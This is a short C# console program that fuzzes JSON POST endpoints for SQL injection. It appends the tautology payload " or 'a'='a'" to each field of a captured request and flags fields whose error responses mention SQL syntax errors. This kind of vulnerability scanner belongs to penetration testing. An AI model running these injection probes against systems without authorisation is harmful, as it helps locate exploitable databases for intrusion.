using System;
using Newtonsoft.Json.Linq;
using System.Net;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;

namespace FuzzJson
{
    class Program
    {
        public static void Main(string[] args)
        {
            try
            {
                string url;
                string requestFile;
                string[] request = null;

                try
                {
                    url = args[0];
                    requestFile = args[1];
                }
                catch (Exception)
                {
                    throw new Exception(string.Format("Usage: {0} URL FILENAME\r\n", 
                        System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName));
                }

                using (StreamReader rdr = new StreamReader(File.OpenRead(requestFile)))
                    request = rdr.ReadToEnd().Split('\n');

                string json = request[request.Length - 1];
                JObject obj = JObject.Parse(json);

                Console.WriteLine("Fuzzing POST requests to URL " + url);
                IterateAndFuzz(url, obj);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        private static void IterateAndFuzz(string url, JObject obj)
        {
            foreach (var pair in (JObject)obj.DeepClone())
            {
                if (pair.Value.Type == JTokenType.String || pair.Value.Type == JTokenType.Integer)
                {
                    Console.WriteLine("Fuzzing key: " + pair.Key);

                    if (pair.Value.Type == JTokenType.Integer)
                        Console.WriteLine("Converting int type to string to fuzz");

                    JToken oldVal = pair.Value;
                    obj[pair.Key] = pair.Value.ToString() + " or 'a'='a'";

                    if (Fuzz(url, obj.Root))
                        Console.WriteLine("SQL injection vector: " + pair.Key);
                    else
                        Console.WriteLine(pair.Key + " does not seem vulnerable.");

                    obj[pair.Key] = oldVal;
                }
            }
        }

        private static bool Fuzz(string url, JToken obj)
        {
            byte[] data = System.Text.Encoding.ASCII.GetBytes(obj.ToString());

            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
            req.Method = "POST";
            req.ContentLength = data.Length;
            req.ContentType = "application/javascript";

            using (Stream stream = req.GetRequestStream())
                stream.Write(data, 0, data.Length);

            string resp = string.Empty;
            try
            {
                req.GetResponse();
            }
            catch (WebException e)
            {
                using (StreamReader r = new StreamReader(e.Response.GetResponseStream()))
                    resp = r.ReadToEnd();

                return (resp.Contains("syntax error") || resp.Contains("unterminated quoted string"));
            }

            return false;
        }
    }
}
